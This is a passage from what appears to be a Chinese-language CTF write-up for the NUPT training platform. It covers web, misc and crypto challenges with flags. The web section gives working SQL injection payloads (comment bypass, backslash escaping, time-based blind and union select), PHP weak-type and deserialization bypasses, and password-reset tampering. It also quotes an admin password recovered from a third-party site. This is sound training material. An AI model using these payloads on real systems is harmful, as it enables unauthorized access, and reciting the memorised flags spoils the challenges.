admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br></pre></td></tr></table></figure><p>会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code> ，</p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式<code>#</code>注释到行尾，<code>/*bla*/</code>用于行间或多行注释，<code>--</code>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个<code>\s</code>，也就是空格，TAB，换行符等。</p><p>所以本题可post <code>user=admin&#39;)-- -&amp;pass=123</code>或<code>user=admin&#39;)#&amp;pass=123</code>，</p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code>,</p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h4 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a><a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">pass check</a></h4><p><em>nctf{strcmp_is_n0t_3afe}</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为<code>pass[]=</code></p><h4 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h4><p><em>nctf{follow_your_dream}</em></p><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt;  <span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function">&gt; </span>&#123;</span><br><span class="line">&gt;         $one = ord(<span class="string">'1'</span>);</span><br><span class="line">&gt;         $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">&gt;         <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&gt;         &#123;   </span><br><span class="line">&gt;                 $digit = ord($number&#123;$i&#125;);</span><br><span class="line">&gt;                 <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&gt;                 &#123;</span><br><span class="line">&gt;                         <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&gt;                 &#125;</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;            <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $flag=<span class="string">'*******'</span>;</span><br><span class="line">&gt; <span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">&gt;     <span class="keyword">echo</span> $flag;</span><br><span class="line">&gt; <span class="keyword">else</span> </span><br><span class="line">&gt;     <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line">&gt; <span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>，</p><p>因此访问 <em><a href="http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</a></em> </p><h4 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h4><blockquote><p>重置管理员账号：admin 的密码</p><p>你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件：</p><p>点击<a href="http://nctf.nuptzj.cn/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D" target="_blank" rel="noopener">此链接</a>重置您的密码</p></blockquote><p><em>nctf{reset_password_often_have_vuln</em></p><p>修改重置链接的URL和POST中对应参数为admin相关的即可。</p><p>即向 <em><a href="http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D</a></em>  post <em>user=admin&amp;newpass=aaaaa&amp;vcode=1234</em>  。</p><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a><a href="http://115.28.150.176/php1/index.php" target="_blank" rel="noopener">php反序列化</a></h4><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">&gt;     <span class="keyword">var</span> $enter;</span><br><span class="line">&gt;     <span class="keyword">var</span> $secret;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">&gt;     $pass = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">&gt;     <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">&gt;         $pass=stripslashes($pass);</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     $o = unserialize($pass);</span><br><span class="line">&gt;     <span class="keyword">if</span> ($o) &#123;</span><br><span class="line">&gt;         $o-&gt;secret = <span class="string">"*"</span>;</span><br><span class="line">&gt;         <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">&gt;             <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</span><br><span class="line">&gt;         <span class="keyword">else</span> </span><br><span class="line">&gt;             <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;     <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同，</p><p>从官方文档看到这么一句</p><p><code>Circular references inside the array/object you are serializing will also be stored</code>，</p><p>说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $secret;</span><br><span class="line">    <span class="keyword">var</span> $enter ;</span><br><span class="line">&#125;</span><br><span class="line">$f=<span class="keyword">new</span> just4fun();</span><br><span class="line">$f-&gt;enter=&amp;$f-&gt;secret;</span><br><span class="line">$sf=serialize($f);</span><br><span class="line">print_r($sf);</span><br><span class="line"></span><br><span class="line">$usf=unserialize($sf);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">print_r($usf);</span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}<br>just4fun Object ( [secret] =&gt; [enter] =&gt; )</p></blockquote><p>访问</p><p><code>http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;}</code></p><p>验证成功。</p><p>别处看到flag为<code>nctf{serialize_and_unserialize}</code></p><h4 id="sql-injection4"><a href="#sql-injection4" class="headerlink" title="sql injection4"></a>sql injection4</h4><blockquote><p>继续注入吧~<br><a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">题目地址</a></p><p>TIP:反斜杠可以用来转义<br>仔细查看相关函数的用法</p></blockquote><p><em>nctf{sql_injection_is_interesting}</em></p><p>页面源代码注释中有SQL构造方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p>核心函数是<code>htmlentities($str, ENT_QUOTES)</code> ，函数原型是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] )</span><br></pre></td></tr></table></figure><p>参数flags缺省情况下与<code>$flags=ENT_QUOTES</code>情况下函数行为不同，</p><p>选值为<code>ENT_QUOTES</code>时<code>Will convert both double and single quotes</code>，</p><p>也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。</p><p>访问<code>http://chinalover.sinaapp.com/web15/index.php?username=\&amp;password=%20or%201%23</code>，</p><p>也就是构造payload为<code>?username=\&amp;password=%20or%201%23</code> ，使得查询语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'\' AND pass='</span>%<span class="number">20</span><span class="keyword">or</span>%<span class="number">201</span>%<span class="number">23</span><span class="string">'</span></span><br><span class="line"><span class="string">即</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE </span></span><br><span class="line"><span class="string">name='</span>\<span class="string">' AND pass='</span>  『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></span><br><span class="line"><span class="string">or 1                 『 但没关系，[false or 1] 的逻辑值为真』 </span></span><br><span class="line"><span class="string">#'</span>                   『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>附：</p><p>​    具体编码方式可使用</p><p><code>print_r(get_html_translation_table($table =HTML_ENTITIES,$flags=ENT_QUOTES))</code>查看，</p><table><thead><tr><th style="text-align:center">`ENT_COMPAT</th><th style="text-align:center">ENT_HTML401`</th><th><code>ENT_QUOTES</code></th></tr></thead><tbody><tr><td style="text-align:center"><code>[&amp;] =&gt; &amp;amp;</code></td><td style="text-align:center"><code>[&amp;] =&gt; &amp;amp;</code></td></tr><tr><td style="text-align:center"><code>[&quot;] =&gt; &amp;quot;</code></td><td style="text-align:center"><code>[&quot;] =&gt; &amp;quot;</code></td></tr><tr><td style="text-align:center"><code>[&lt;] =&gt; &amp;lt;</code></td><td style="text-align:center"><code>[&#39;] =&gt; &amp;#039;</code></td></tr><tr><td style="text-align:center"><code>[&gt;] =&gt; &amp;gt;</code></td><td style="text-align:center"><code>[&lt;] =&gt; &amp;lt;</code></td></tr><tr><td style="text-align:center">…</td><td style="text-align:center"><code>[&gt;] =&gt; &amp;gt;</code></td></tr><tr><td style="text-align:center">共100个</td><td style="text-align:center">共101个</td></tr></tbody></table><h4 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">综合题</a></h4><p><em>nctf{bash_history_means_what}</em></p><p>1、访问链接得到一大段jsfuck代码，解码后得到<code>document.write(&quot;1bc29b36f623ba82aaf6724fd3b16718.php&quot;)</code> ;</p><p>2、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></em> 在HTTP响应头得到提示<code>tip:history of bash</code>;</p><p>3、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a></em>  ，看到页面内容为<code>zip -r flagbak.zip ./*</code> ;</p><p>4、访问 <em><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a></em>  得到flag。</p><h4 id="sql-注入2"><a href="#sql-注入2" class="headerlink" title="sql 注入2"></a>sql 注入2</h4><blockquote><p>注入第二题~~主要考察union查询<br>传送门:<a href="http://4.chinalover.sinaapp.com/web6/index.php" target="_blank" rel="noopener">点我带你飞</a></p></blockquote><p><em>ntcf{union_select_is_wtf}</em></p><p><code>index/phps</code>中有源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(!strcasecmp(<span class="keyword">array</span>(), $query[pw]));<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(!strcasecmp(md5(<span class="keyword">array</span>()), $query[pw]));<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure><p>所以没法用把pass作为数组传进去的伎俩。另外虽然第七行的<code>$user</code>处存在注入，但输出没有回显。想到基于时间延迟的盲注。主要用到三个函数，<a href="https://dev.mysql.com/doc/refman/5.5/en/string-functions.html#function_mid" target="_blank" rel="noopener">mid()</a>，<a href="https://dev.mysql.com/doc/refman/5.5/en/control-flow-functions.html#function_if" target="_blank" rel="noopener">if()</a>和<a href="https://dev.mysql.com/doc/refman/5.5/en/miscellaneous-functions.html#function_sleep" target="_blank" rel="noopener">sleep()</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MID(str,pos,len)</span><br><span class="line">/*需注意pos从1而不是0开始，Return a substring starting from the specified position*/</span><br><span class="line">IF(expr1,expr2,expr3)</span><br><span class="line">/*If expr1 is TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL), IF() returns expr2. Otherwise, it returns expr3.*/</span><br><span class="line">SLEEP(duration)</span><br><span class="line">/*Sleeps (pauses) for the number of seconds given by the duration argument, then returns 0.If SLEEP() is interrupted, it returns 1. The duration may have a fractional part.*/</span><br></pre></td></tr></table></figure><p>所以构造post数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin<span class="string">' and if(mid(pw,1,1)&gt;'</span><span class="number">9</span><span class="string">',sleep(2),1)#&amp;pass=blabla</span></span><br></pre></td></tr></table></figure><p>如果<code>if()</code>函数的<code>expr1</code>正确，页面响应就会延时两秒，否则不会，以此为依据采用二分法调整。</p><p><code>pw</code>字段的取值范围为<code>/[\da-e]/</code>，</p><p>最后注处字段值为<code>21dd715a3605b2a4053e80387116c190</code>，即<code>md5(&#39;njupt&#39;)</code></p><p>然后post<code>user=admin&amp;pass=njupt</code>即可。 </p><blockquote><p> index.phps藏源码。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;  查到另一种简单的做法，即post如下数据</span><br><span class="line">&gt;  user=&apos; union select &apos;45cf93bd4f762c6597b68e615b153bd0&apos;#&amp;pass=findneo</span><br><span class="line">&gt;  其中&apos;45cf93bd4f762c6597b68e615b153bd0&apos;即md5(&apos;findneo&apos;)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p> 这才是出题者的本意。我觉得这个做法很妙，看似理所当然的代码逻辑实际上不堪一击。</p></blockquote><h4 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h4><blockquote><p>非xss题 但是欢迎留言~<br>地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">get the flag</a></p><p><code>flag:nctf{you_are_s0_g00d_hacker}</code></p></blockquote><p>详见<a href="https://findneo.github.io/2017/10/nupt-zonghe2/">南邮CTF平台综合题2writeup</a></p><h4 id="注入实战一"><a href="#注入实战一" class="headerlink" title="注入实战一"></a>注入实战一</h4><blockquote><p>请使用firefox浏览器，并安装hackbar插件（自行百度并熟悉）<br>目标网址：<a href="http://www.backstagecommerce.ca/services.php?id=4" target="_blank" rel="noopener">地址</a><br>flag为管理员密码的32位md5(小写)<br>并且加上nctf{}</p><p>手注教程群里面发过。<br>看不懂的话自行百度”mysql手动注入”查阅相关文章</p><p>PS:用sqlmap等工具做的就不要厚脸皮提交了</p></blockquote><p>题目貌似坏了，放个  <a href="http://blog.csdn.net/qq_31481187/article/details/52097287#t33" target="_blank" rel="noopener">4ct10n 的解答</a>吧。</p><blockquote><p>密码就在上图BSCmarketing24<br>然后再md5加密成 f3d6cc916d0739d853e50bc92911dddb<br>flag: nctf{f3d6cc916d0739d853e50bc92911dddb}</p></blockquote><h4 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h4><blockquote><p>题题被秒，当时我就不乐意了！<br>本题来源于CUMT<br><a href="http://nctf.nuptzj.cn/web14/index.php" target="_blank" rel="noopener">题目链接</a></p><p>TIPS:<br>1.管理员邮箱观察一下就可以找到<br>2.linux下一般使用vi编辑器，并且异常退出会留下备份文件。(用vim编辑则不会)<br>3.弱类型bypass</p></blockquote><p><em>nctf{thanks_to_cumt_bxs}</em></p><p>1、按照提示，源码中看到管理员邮箱为<a href="mailto:`admin@nuptzj.cn" target="_blank" rel="noopener">`admin@nuptzj.cn</a>` ；</p><p>2、<code>wget http://nctf.nuptzj.cn/web14/.submit.php.swp</code> ；</p><p>3、<code>vi -r .submit.php.swp</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求token长度为10且<code>token!=&#39;0&#39;</code>为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以<code>&#39;0e123&#39;==&#39;0&#39;</code>值为真）绕过，访问 <em><a href="http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678" target="_blank" rel="noopener">http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&amp;token=0e12345678</a></em>  即可。 </p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h4><blockquote><p>flag是动态图最后一句话的拼音首字母<br>加上nctf{}</p></blockquote><p><em>nctf{dssdcmlw}</em></p><p><code>binwalk -e 555.gif</code>分离出一张233333.gif，动态图的最后一帧的最后一句话是 <em>都深深的出卖了我</em> </p><h4 id="丘比龙De女神"><a href="#丘比龙De女神" class="headerlink" title="丘比龙De女神"></a>丘比龙De女神</h4><blockquote><p>丘比龙是丘比特的弟弟，由于吃了太多的甜甜圈导致他飞不动了！</p><p>没错 里面隐藏了一张女神的照片<br>flag是照片文件的md5值(小写)<br>记住加上flag{}</p></blockquote><p>文件尾有nvshen.jpg字样，故搜索字符串nvshen，共出现两次，猜测从第一次出现位置上方的love起到文件末尾为一个密码为love的压缩包，复制出来后修改<code>6C6F7665</code> 为<code>504b0304</code> ,解压得到女神的照片。</p><p>flag{a6caad3aaafa11b6d5ed583bef4d8a54} </p><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="easy"><a href="#easy" class="headerlink" title="easy!"></a>easy!</h4><blockquote><p>密文：bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9<br>这题做不出来就剁手吧！</p></blockquote><p><em>nctf{this_is_base64_encode}</em></p><p>在Linux命令行输入<code>echo bmN0Znt0aGlzX2lzX2Jhc2U2NF9lbmNvZGV9 | base64 -d</code>即可</p><h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><blockquote><p>看键盘看键盘看键盘！<br>答案非标准格式，提交前加上nctf{}<br>ytfvbhn tgbgy hjuygbn yhnmki tgvhn uygbnjm uygbn yhnijm</p></blockquote><p>观察题干字符串在键盘上的位置构成的轨迹。</p><p> <em>nctf{areuhack}</em> </p><h4 id="base64全家桶"><a href="#base64全家桶" class="headerlink" title="base64全家桶"></a>base64全家桶</h4><blockquote><p>全家桶全家桶全家桶！<br>我怎么饿了。。。。。。<br>密文(解密前删除回车)：</p><p>R1pDVE1NWlhHUTNETU4yQ0dZWkRNTUpYR00zREtNWldHTTJES<br>1JSV0dJM0RDTlpUR1kyVEdNWlRHSTJVTU5SUkdaQ1RNTkJWSVk<br>zREVOUlJHNFpUTU5KVEdFWlRNTjJF</p></blockquote><p>按base64、base32、base16的顺序解码一遍即可。</p><p><em>nctf{base64 _ base32_and_base16}</em></p><h4 id="n次base64"><a href="#n次base64" class="headerlink" title="n次base64"></a><a href="http://chinalover.sinaapp.com/decode1/base64.txt" target="_blank" rel="noopener">n次base64</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line">s=<span class="string">'**'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  s=b.b64decode(s)</span><br><span class="line">  <span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p><em>nctf{please_use_python_to_decode_base64}</em></p><h4 id="骚年来一发吗"><a href="#骚年来一发吗" class="headerlink" title="骚年来一发吗"></a>骚年来一发吗</h4><blockquote><p>密文：iEJqak3pjIaZ0NzLiITLwWTqzqGAtW2oyOTq1A3pzqas</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span 